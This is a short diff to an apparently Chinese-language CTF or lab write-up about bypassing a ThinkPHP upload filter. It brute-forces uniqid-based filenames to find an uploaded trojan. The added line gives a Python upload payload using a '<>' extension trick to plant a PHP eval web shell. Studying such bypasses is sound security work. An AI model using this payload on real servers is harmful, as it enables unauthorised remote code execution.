@@ -72,6 +72,7 @@ Date: 2020-12-27
 采用下面的脚本，上传多个文件，来绕过对文件后缀名的检测
 
 > 查看thinkphp源码得知文件名是通过uniqid函数生成的，uniqid函数是基于**以微秒计**的当前时间计算的，两个同时上传生成的文件名相差不会太远，因此可以在两个文件名之间进行暴力遍历，找到上传的木马文件的文件名。
+> 除了此方法外，还可以使用`<>`绕过，载荷为`res=requests.post(url,files={'file':('webshell.<>php','<?php @eval($_POST["shell"]); ?>')})`
 
 ```python
 import requests
